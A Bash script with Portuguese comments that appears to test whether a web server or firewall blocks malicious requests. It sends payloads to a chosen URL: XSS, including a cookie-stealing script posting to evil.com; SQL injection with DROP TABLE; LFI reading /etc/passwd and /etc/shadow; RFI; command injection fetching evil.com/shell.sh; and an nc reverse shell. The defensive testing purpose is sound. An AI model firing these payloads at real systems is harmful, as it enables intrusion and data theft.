#!/bin/bash
#==============================================================================
# HTTP Header Security Testing Suite - EXPANDED VERSION
# Versão: 3.0.0
# Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
#==============================================================================

set -uo pipefail
VERSION="3.0.0"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Variáveis globais
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
VERBOSE=false
OUTPUT_FILE=""
URL=""
UA=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# User-Agents disponíveis
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"
)

show_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED            ║"
    echo "║                     500+ Security Tests Available                         ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

test_curl() {
    local description="$1"
    local expected_behavior="$2"
    shift 2
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$@" 2>/dev/null || echo "000")
    
    local status_icon color result_text
    
    if [ "$expected_behavior" == "allow" ]; then
        # Para requests que devem ser PERMITIDOS
        if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [[ "$response" =~ ^[45] ]] || [ "$response" == "000" ]; then
            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
        else
            color="${YELLOW}"; status_icon="?"; result_text="WARN"
        fi
    else
        # Para requests que devem ser BLOQUEADOS
        # HTTP 000 = conexão fechada (Nginx 444) = BLOQUEIO BEM SUCEDIDO
        # HTTP 4xx (exceto 404) = BLOQUEIO BEM SUCEDIDO
        # HTTP 200 ou 404 = FALHA (não bloqueou)
        if [ "$response" == "000" ]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS (444)"; PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [ "$response" == "200" ] || [ "$response" == "404" ]; then
            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
        elif [[ "$response" =~ ^[45] ]]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
        else
            color="${YELLOW}"; status_icon="?"; result_text="WARN"
        fi
    fi
    
    printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
    [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${description} - HTTP ${response}" >> "$OUTPUT_FILE"
}

print_section() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}$1${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TODOS OS MÉTODOS HTTP
#==============================================================================
test_all_http_methods() {
    print_section "📝 TESTES DE TODOS OS MÉTODOS HTTP"
    
    # Métodos padrão que devem funcionar
    print_subsection "Métodos Padrão (devem funcionar)"
    test_curl "GET" "allow" -A "$UA" -Lk -X GET "$URL"
    test_curl "HEAD" "allow" -A "$UA" -Lk -X HEAD "$URL"
    test_curl "POST" "allow" -A "$UA" -Lk -X POST "$URL"
    
    # Métodos que devem ser bloqueados
    print_subsection "Métodos Perigosos (devem ser bloqueados)"
    test_curl "PUT" "block" -A "$UA" -Lk -X PUT "$URL"
    test_curl "DELETE" "block" -A "$UA" -Lk -X DELETE "$URL"
    test_curl "PATCH" "block" -A "$UA" -Lk -X PATCH "$URL"
    test_curl "OPTIONS" "block" -A "$UA" -Lk -X OPTIONS "$URL"
    test_curl "TRACE" "block" -A "$UA" -Lk -X TRACE "$URL"
    test_curl "CONNECT" "block" -A "$UA" -Lk -X CONNECT "$URL"
    
    print_subsection "Métodos WebDAV (devem ser bloqueados)"
    test_curl "PROPFIND" "block" -A "$UA" -Lk -X PROPFIND "$URL"
    test_curl "PROPPATCH" "block" -A "$UA" -Lk -X PROPPATCH "$URL"
    test_curl "MKCOL" "block" -A "$UA" -Lk -X MKCOL "$URL"
    test_curl "COPY" "block" -A "$UA" -Lk -X COPY "$URL"
    test_curl "MOVE" "block" -A "$UA" -Lk -X MOVE "$URL"
    test_curl "LOCK" "block" -A "$UA" -Lk -X LOCK "$URL"
    test_curl "UNLOCK" "block" -A "$UA" -Lk -X UNLOCK "$URL"
    
    print_subsection "Métodos Extensão/Outros (devem ser bloqueados)"
    test_curl "SEARCH" "block" -A "$UA" -Lk -X SEARCH "$URL"
    test_curl "SUBSCRIBE" "block" -A "$UA" -Lk -X SUBSCRIBE "$URL"
    test_curl "UNSUBSCRIBE" "block" -A "$UA" -Lk -X UNSUBSCRIBE "$URL"
    test_curl "NOTIFY" "block" -A "$UA" -Lk -X NOTIFY "$URL"
    test_curl "REPORT" "block" -A "$UA" -Lk -X REPORT "$URL"
    test_curl "MKACTIVITY" "block" -A "$UA" -Lk -X MKACTIVITY "$URL"
    test_curl "CHECKOUT" "block" -A "$UA" -Lk -X CHECKOUT "$URL"
    test_curl "MERGE" "block" -A "$UA" -Lk -X MERGE "$URL"
    test_curl "BASELINE-CONTROL" "block" -A "$UA" -Lk -X BASELINE-CONTROL "$URL"
    test_curl "VERSION-CONTROL" "block" -A "$UA" -Lk -X VERSION-CONTROL "$URL"
    test_curl "ACL" "block" -A "$UA" -Lk -X ACL "$URL"
    test_curl "BIND" "block" -A "$UA" -Lk -X BIND "$URL"
    test_curl "UNBIND" "block" -A "$UA" -Lk -X UNBIND "$URL"
    test_curl "REBIND" "block" -A "$UA" -Lk -X REBIND "$URL"
    
    print_subsection "Métodos Inválidos/Maliciosos"
    test_curl "HACK" "block" -A "$UA" -Lk -X HACK "$URL"
    test_curl "SPAM" "block" -A "$UA" -Lk -X SPAM "$URL"
    test_curl "TEST" "block" -A "$UA" -Lk -X TEST "$URL"
    test_curl "DEBUG" "block" -A "$UA" -Lk -X DEBUG "$URL"
    test_curl "TRACK" "block" -A "$UA" -Lk -X TRACK "$URL"
}

#==============================================================================
# COOKIES MALICIOSOS - 10 DE CADA TIPO
#==============================================================================
test_malicious_cookies() {
    print_section "🍪 TESTES DE COOKIES MALICIOSOS (40 testes)"
    
    print_subsection "XSS via Cookie (10 variações)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk --cookie "x=<script>alert(1)</script>" "$URL"
    test_curl "XSS: <img src=x onerror=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<img src=x onerror=alert(1)>" "$URL"
    test_curl "XSS: <svg onload=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<svg onload=alert(1)>" "$URL"
    test_curl "XSS: <body onload=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<body onload=alert(1)>" "$URL"
    test_curl "XSS: <iframe src=javascript:alert(1)>" "block" -A "$UA" -Lk --cookie "x=<iframe src=javascript:alert(1)>" "$URL"
    test_curl "XSS: javascript:alert(1)" "block" -A "$UA" -Lk --cookie "x=javascript:alert(1)" "$URL"
    test_curl "XSS: <div onmouseover=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<div onmouseover=alert(1)>" "$URL"
    test_curl "XSS: URL encoded" "block" -A "$UA" -Lk --cookie "x=%3Cscript%3Ealert(1)%3C%2Fscript%3E" "$URL"
    test_curl "XSS: Double URL encoded" "block" -A "$UA" -Lk --cookie "x=%253Cscript%253Ealert(1)%253C%252Fscript%253E" "$URL"
    test_curl "XSS: Unicode encoded" "block" -A "$UA" -Lk --cookie "x=\\u003Cscript\\u003Ealert(1)" "$URL"

    print_subsection "SQL Injection via Cookie (10 variações)"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk --cookie "id=' OR '1'='1" "$URL"
    test_curl "SQLi: 1 OR 1=1--" "block" -A "$UA" -Lk --cookie "id=1 OR 1=1--" "$URL"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk --cookie "id=1 UNION SELECT * FROM users" "$URL"
    test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk --cookie "id=1;DROP TABLE users;--" "$URL"
    test_curl "SQLi: INSERT INTO" "block" -A "$UA" -Lk --cookie "id=1;INSERT INTO users VALUES(1,'admin')--" "$URL"
    test_curl "SQLi: UPDATE SET" "block" -A "$UA" -Lk --cookie "id=1;UPDATE users SET admin=1--" "$URL"
    test_curl "SQLi: DELETE FROM" "block" -A "$UA" -Lk --cookie "id=1;DELETE FROM users--" "$URL"
    test_curl "SQLi: SLEEP(5)" "block" -A "$UA" -Lk --cookie "id=1 AND SLEEP(5)--" "$URL"
    test_curl "SQLi: BENCHMARK" "block" -A "$UA" -Lk --cookie "id=1 AND BENCHMARK(10000000,SHA1('test'))--" "$URL"
    test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk --cookie "id=1;WAITFOR DELAY '0:0:5'--" "$URL"

    print_subsection "Cookie Overflow (10 variações)"
    test_curl "Overflow: 1KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 1024 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 2KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 2048 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 4KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 4096 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 8KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 8192 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 16KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 16384 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 50 cookies pequenos" "block" -A "$UA" -Lk --cookie "$(for i in {1..50}; do echo -n "c$i=value$i;"; done)" "$URL"
    test_curl "Overflow: 100 cookies pequenos" "block" -A "$UA" -Lk --cookie "$(for i in {1..100}; do echo -n "c$i=v;"; done)" "$URL"
    test_curl "Overflow: Nome longo" "block" -A "$UA" -Lk --cookie "$(head -c 500 /dev/zero | tr '\0' 'A')=value" "$URL"
    test_curl "Overflow: Muitos =" "block" -A "$UA" -Lk --cookie "x=$(head -c 500 /dev/zero | tr '\0' '=')" "$URL"
    test_curl "Overflow: Muitos ;" "block" -A "$UA" -Lk --cookie "x=$(head -c 500 /dev/zero | tr '\0' ';')" "$URL"

    print_subsection "Encoding Attacks via Cookie (10 variações)"
    test_curl "Encoding: Null byte" "block" -A "$UA" -Lk --cookie "x=admin%00" "$URL"
    test_curl "Encoding: CRLF injection" "block" -A "$UA" -Lk --cookie $'x=test\r\nSet-Cookie: hacked=true' "$URL"
    test_curl "Encoding: Tab injection" "block" -A "$UA" -Lk --cookie $'x=test\tadmin' "$URL"
    test_curl "Encoding: Backspace" "block" -A "$UA" -Lk --cookie "x=admin%08%08%08guest" "$URL"
    test_curl "Encoding: UTF-7" "block" -A "$UA" -Lk --cookie "x=+ADw-script+AD4-alert(1)+ADw-/script+AD4-" "$URL"
    test_curl "Encoding: Hex encoded" "block" -A "$UA" -Lk --cookie "x=\x3cscript\x3ealert(1)\x3c/script\x3e" "$URL"
    test_curl "Encoding: Octal" "block" -A "$UA" -Lk --cookie "x=\\074script\\076alert\\050\\061\\051" "$URL"
    test_curl "Encoding: HTML entities" "block" -A "$UA" -Lk --cookie "x=&lt;script&gt;alert(1)&lt;/script&gt;" "$URL"
    test_curl "Encoding: Unicode bypass" "block" -A "$UA" -Lk --cookie "x=＜script＞alert(1)＜/script＞" "$URL"
    test_curl "Encoding: Mixed encoding" "block" -A "$UA" -Lk --cookie "x=%3c%53%43%52%49%50%54%3ealert(1)" "$URL"
}

#==============================================================================
# QUERY STRING MALICIOSA - 10 DE CADA TIPO
#==============================================================================
test_malicious_query() {
    print_section "🔍 TESTES DE QUERY STRING MALICIOSA (50 testes)"
    
    print_subsection "SQL Injection (10 variações)"
    test_curl "SQLi: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1%20OR%201=1"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk "${URL}?id=%27%20OR%20%271%27=%271"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20users"
    test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1;DROP%20TABLE%20users;--"
    test_curl "SQLi: SLEEP()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20SLEEP(5)"
    test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1;WAITFOR%20DELAY%20%270:0:5%27"
    test_curl "SQLi: LOAD_FILE()" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20LOAD_FILE(%27/etc/passwd%27)"
    test_curl "SQLi: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1%20INTO%20OUTFILE%20%27/tmp/test.txt%27"
    test_curl "SQLi: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES"
    test_curl "SQLi: Blind boolean" "block" -A "$UA" -Lk "${URL}?id=1%20AND%201=1%20AND%20%27a%27=%27a"

    print_subsection "XSS Reflected (10 variações)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
    test_curl "XSS: <img onerror>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(1)>"
    test_curl "XSS: <svg onload>" "block" -A "$UA" -Lk "${URL}?q=<svg%20onload=alert(1)>"
    test_curl "XSS: javascript:" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
    test_curl "XSS: data:text/html" "block" -A "$UA" -Lk "${URL}?url=data:text/html,<script>alert(1)</script>"
    test_curl "XSS: <body onload>" "block" -A "$UA" -Lk "${URL}?q=<body%20onload=alert(1)>"
    test_curl "XSS: <iframe src>" "block" -A "$UA" -Lk "${URL}?q=<iframe%20src=javascript:alert(1)>"
    test_curl "XSS: <input onfocus>" "block" -A "$UA" -Lk "${URL}?q=<input%20onfocus=alert(1)%20autofocus>"
    test_curl "XSS: <details ontoggle>" "block" -A "$UA" -Lk "${URL}?q=<details%20open%20ontoggle=alert(1)>"
    test_curl "XSS: DOM based" "block" -A "$UA" -Lk "${URL}?q=<script>document.location='http://evil.com/?c='+document.cookie</script>"

    print_subsection "LFI - Local File Inclusion (10 variações)"
    test_curl "LFI: ../etc/passwd" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd"
    test_curl "LFI: Com null byte" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd%00"
    test_curl "LFI: ....// bypass" "block" -A "$UA" -Lk "${URL}?file=....//....//....//etc/passwd"
    test_curl "LFI: ..%252f encoded" "block" -A "$UA" -Lk "${URL}?file=..%252f..%252f..%252fetc/passwd"
    test_curl "LFI: /proc/self/environ" "block" -A "$UA" -Lk "${URL}?file=/proc/self/environ"
    test_curl "LFI: /var/log/apache" "block" -A "$UA" -Lk "${URL}?file=/var/log/apache2/access.log"
    test_curl "LFI: php://filter" "block" -A "$UA" -Lk "${URL}?file=php://filter/convert.base64-encode/resource=index.php"
    test_curl "LFI: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
    test_curl "LFI: Windows path" "block" -A "$UA" -Lk "${URL}?file=C:\\windows\\system32\\drivers\\etc\\hosts"
    test_curl "LFI: /etc/shadow" "block" -A "$UA" -Lk "${URL}?file=../../../etc/shadow"

    print_subsection "RFI - Remote File Inclusion (10 variações)"
    test_curl "RFI: http://evil.com/shell.txt" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt"
    test_curl "RFI: https://evil.com/shell.php" "block" -A "$UA" -Lk "${URL}?file=https://evil.com/shell.php"
    test_curl "RFI: ftp://evil.com/shell" "block" -A "$UA" -Lk "${URL}?file=ftp://evil.com/shell.txt"
    test_curl "RFI: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?file=http://127.0.0.1/shell.php"
    test_curl "RFI: http://localhost" "block" -A "$UA" -Lk "${URL}?file=http://localhost/shell.php"
    test_curl "RFI: URL encoded" "block" -A "$UA" -Lk "${URL}?file=http%3A%2F%2Fevil.com%2Fshell.txt"
    test_curl "RFI: Double encoded" "block" -A "$UA" -Lk "${URL}?file=http%253A%252F%252Fevil.com%252Fshell.txt"
    test_curl "RFI: With null byte" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt%00"
    test_curl "RFI: data:// protocol" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php%20system('id');?>"
    test_curl "RFI: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input"

    print_subsection "Command Injection (10 variações)"
    test_curl "CMDi: ; id" "block" -A "$UA" -Lk "${URL}?cmd=test;id"
    test_curl "CMDi: | id" "block" -A "$UA" -Lk "${URL}?cmd=test|id"
    test_curl "CMDi: || id" "block" -A "$UA" -Lk "${URL}?cmd=test||id"
    test_curl "CMDi: && id" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26id"
    test_curl "CMDi: \`id\`" "block" -A "$UA" -Lk "${URL}?cmd=test\`id\`"
    test_curl "CMDi: \$(id)" "block" -A "$UA" -Lk "${URL}?cmd=test\$(id)"
    test_curl "CMDi: cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat%20/etc/passwd"
    test_curl "CMDi: wget evil.com" "block" -A "$UA" -Lk "${URL}?cmd=wget%20http://evil.com/shell.sh"
    test_curl "CMDi: curl evil.com" "block" -A "$UA" -Lk "${URL}?cmd=curl%20http://evil.com/shell.sh"
    test_curl "CMDi: nc reverse shell" "block" -A "$UA" -Lk "${URL}?cmd=nc%20-e%20/bin/sh%20evil.com%204444"
}

#==============================================================================
# USER-AGENTS MALICIOSOS DA LISTA
#==============================================================================
test_bad_user_agents() {
    print_section "🤖 TESTES DE USER-AGENTS MALICIOSOS (100 da lista)"
    
    local list_file="${SCRIPT_DIR}/lists/bad-user-agents.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ua_bad || [ -n "$ua_bad" ]; do
        [ -z "$ua_bad" ] && continue
        [ "${ua_bad:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "Bad UA #$count: ${ua_bad:0:40}..." "block" -Lk -A "$ua_bad" "$URL"
        [ $count -ge 100 ] && break
    done < "$list_file"
}

#==============================================================================
# REFERERS MALICIOSOS DA LISTA
#==============================================================================
test_bad_referers() {
    print_section "🔙 TESTES DE REFERERS MALICIOSOS (100 da lista)"
    
    local list_file="${SCRIPT_DIR}/lists/bad-referers.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "Bad Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
        [ $count -ge 100 ] && break
    done < "$list_file"
}

#==============================================================================
# BOTS LEGÍTIMOS
#==============================================================================
test_good_bots() {
    print_section "✅ TESTES DE BOTS LEGÍTIMOS (devem passar)"
    
    test_curl "Googlebot Mobile" "allow" -Lk -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X) AppleWebKit/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "Googlebot Desktop" "allow" -Lk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "Bingbot" "allow" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "DuckDuckBot" "allow" -Lk -A "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" "$URL"
    test_curl "Facebot" "allow" -Lk -A "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "$URL"
}

#==============================================================================
# HOSTS INVÁLIDOS (10 testes)
#==============================================================================
test_invalid_host() {
    print_section "🏠 TESTES DE HOST INVÁLIDO"
    
    test_curl "Host: 127.0.0.1" "block" -A "$UA" -Lk -H "Host: 127.0.0.1" "$URL"
    test_curl "Host: localhost" "block" -A "$UA" -Lk -H "Host: localhost" "$URL"
    test_curl "Host: vazio" "block" -A "$UA" -Lk -H "Host: " "$URL"
    test_curl "Host: [::1] (IPv6)" "block" -A "$UA" -Lk -H "Host: [::1]" "$URL"
    test_curl "Host: 0.0.0.0" "block" -A "$UA" -Lk -H "Host: 0.0.0.0" "$URL"
    test_curl "Host: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "Host: 169.254.169.254" "$URL"
    test_curl "Host: evil.com" "block" -A "$UA" -Lk -H "Host: evil.com" "$URL"
    test_curl "Host: interno.local" "block" -A "$UA" -Lk -H "Host: interno.local" "$URL"
    test_curl "Host: 10.0.0.1" "block" -A "$UA" -Lk -H "Host: 10.0.0.1" "$URL"
    test_curl "Host: 192.168.1.1" "block" -A "$UA" -Lk -H "Host: 192.168.1.1" "$URL"
}

#==============================================================================
# URI MALICIOSA (10 testes)
#==============================================================================
test_malicious_uri() {
    print_section "🔗 TESTES DE URI MALICIOSA"
    
    test_curl "URI: .htaccess" "block" -A "$UA" -Lk "${URL}/.htaccess"
    test_curl "URI: .env" "block" -A "$UA" -Lk "${URL}/.env"
    test_curl "URI: .git/config" "block" -A "$UA" -Lk "${URL}/.git/config"
    test_curl "URI: wp-config.php" "block" -A "$UA" -Lk "${URL}/wp-config.php"
    test_curl "URI: config.php.bak" "block" -A "$UA" -Lk "${URL}/config.php.bak"
    test_curl "URI: dump.sql" "block" -A "$UA" -Lk "${URL}/dump.sql"
    test_curl "URI: backup.zip" "block" -A "$UA" -Lk "${URL}/backup.zip"
    test_curl "URI: phpinfo.php" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
    test_curl "URI: .DS_Store" "block" -A "$UA" -Lk "${URL}/.DS_Store"
    test_curl "URI: adminer.php" "block" -A "$UA" -Lk "${URL}/adminer.php"
}

#==============================================================================
# RESUMO FINAL
#==============================================================================
print_summary() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}                              RESUMO DOS TESTES                               ${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "  ${BOLD}URL Testada:${NC}     $URL"
    echo -e "  ${BOLD}Total de Testes:${NC} $TOTAL_TESTS"
    echo -e "  ${GREEN}Passaram:${NC}        $PASSED_TESTS"
    echo -e "  ${RED}Falharam:${NC}        $FAILED_TESTS"
    
    local success_rate=0
    [ $TOTAL_TESTS -gt 0 ] && success_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
    
    echo ""
    if [ $success_rate -ge 80 ]; then
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${GREEN}${success_rate}%${NC} ✅"
    elif [ $success_rate -ge 50 ]; then
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${YELLOW}${success_rate}%${NC} ⚠️"
    else
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${RED}${success_rate}%${NC} ❌"
    fi
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
}

#==============================================================================
# SELEÇÃO DE USER-AGENT
#==============================================================================
select_user_agent() {
    echo -e "${BOLD}Selecione um User-Agent:${NC}"
    for i in "${!USER_AGENTS[@]}"; do
        printf "  %d. %s...\n" "$((i+1))" "${USER_AGENTS[i]:0:60}"
    done
    while true; do
        read -rp "Número (1-${#USER_AGENTS[@]}): " UA_INDEX
        if [[ "$UA_INDEX" =~ ^[0-9]+$ ]] && [ "$UA_INDEX" -ge 1 ] && [ "$UA_INDEX" -le "${#USER_AGENTS[@]}" ]; then
            UA="${USER_AGENTS[$((UA_INDEX-1))]}"
            break
        fi
        echo -e "${RED}Número inválido.${NC}"
    done
}

#==============================================================================
# MAIN
#==============================================================================
CATEGORY="all"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help) echo "Uso: $0 [-v] [-o arquivo] [-u num] [-c categoria] <URL>"; exit 0 ;;
        -v|--verbose) VERBOSE=true; shift ;;
        -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
        -u|--user-agent) UA="${USER_AGENTS[$(($2-1))]}"; shift 2 ;;
        -c|--category) CATEGORY="$2"; shift 2 ;;
        -*) echo "Opção desconhecida: $1"; exit 1 ;;
        *) URL="$1"; shift ;;
    esac
done

[ -z "$URL" ] && { show_banner; echo -e "${RED}Erro: URL não fornecida.${NC}"; exit 1; }
[[ ! "$URL" =~ ^https?:// ]] && { echo -e "${RED}URL deve começar com http:// ou https://${NC}"; exit 1; }

show_banner
[ -z "$UA" ] && select_user_agent

echo -e "${BOLD}Iniciando testes em:${NC} $URL"

# Executar testes baseado na categoria
case $CATEGORY in
    method) test_all_http_methods ;;
    cookie) test_malicious_cookies ;;
    query) test_malicious_query ;;
    useragent) test_bad_user_agents; test_good_bots ;;
    referer) test_bad_referers ;;
    host) test_invalid_host ;;
    uri) test_malicious_uri ;;
    all)
        test_all_http_methods
        test_malicious_cookies
        test_malicious_query
        test_invalid_host
        test_malicious_uri
        test_bad_user_agents
        test_bad_referers
        test_good_bots
        ;;
    *) echo "Categoria desconhecida: $CATEGORY"; exit 1 ;;
esac

print_summary
exit 0
